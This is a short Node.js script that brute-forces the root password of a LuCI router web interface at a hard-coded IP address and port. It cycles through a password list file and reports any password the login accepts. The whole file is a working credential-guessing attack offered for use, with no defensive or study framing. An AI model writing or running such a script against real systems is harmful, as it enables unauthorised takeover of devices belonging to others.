const fs = require('fs')
const request = require('request');
const list = fs.readFileSync('./list.txt', 'UTF-8').split('\n')

list.some(pass => {
  request.get({ url: `http://78.155.207.220:9080/cgi-bin/luci?username=root&password=${pass}` }, ((err, res, body) => {
    if (err) {
      console.log(err)
      return false
    }
    if (body.indexOf('Invalid') === -1) {
      console.log('FOUND: ' + pass)
      return true
    } else {
      console.log(pass)
      return false
    }
  }))
})